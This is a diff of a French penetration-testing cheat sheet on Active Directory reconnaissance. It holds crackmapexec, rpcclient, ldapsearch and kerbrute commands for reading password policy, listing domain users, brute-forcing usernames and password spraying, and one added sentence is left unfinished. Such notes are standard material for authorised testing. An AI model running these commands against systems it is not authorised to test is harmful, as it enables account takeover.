@@ -8,6 +8,8 @@ public: true
 
 
 ## Politique de mot de passe
+
+### SMB
 ```shell
 # crackmapexec
 cme smb $TARGET_IP -u "sql_svc" -p "qsdqsd" -d "domain"  --pass-pol | cut -c60-
@@ -19,13 +21,20 @@ enum4linux -u "" -p "" -P $TARGET_IP
 rpcclient -U "" -N $TARGET_IP
 $> querydominfo
 
+```
+
+### LDAP
+
+```shell
 # ldapsearch
 ldapsearch -h $TARGET_IP -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 ```
 
 ## Comptes utilisateurs
 
-### SMB
+### Listing
+
+#### SMB
 
 ```shell
 # crackmapexec
@@ -42,9 +51,9 @@ $> enumdomusers
 cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --users | tr -s ' ' | tail -n +4 | cut -d ' ' -f 5 | cut -d '\' -f 2 | tee users.txt
 ```
 
-### LDAP
+#### LDAP
 
-```
+```shell
 # crackmapexec
 cme ldap -u $AD_USER -p $AD_PASSWORD $TARGET_IP -dc-ip $TARGET_IP --users
 
@@ -52,10 +61,12 @@ cme ldap -u $AD_USER -p $AD_PASSWORD $TARGET_IP -dc-ip $TARGET_IP --users
 ldapsearch -h $TARGET_IP -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -d ' ' -f2
 ```
 
-```
-# Password spraying with new grabbed users
-cme smb $TARGET_IP -u users.txt -p $AD_PASSWORD --continue-on-success
+### Découverte par bruteforce
 
+On pourra utiliser la liste des 
+
+```shell
+kerbrute userenum -d DOMAIN.LOCAL --dc $TARGET_IP userbiglist.Txt
 ```
 
 ### Comptes utilisateurs
@@ -67,7 +78,6 @@ cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --users | tr -s ' ' | tail -n +4 
 
 # Password spraying with new grabbed users
 cme smb $TARGET_IP -u users.txt -p $AD_PASSWORD --continue-on-success
-
 ```
 
 #### Partages
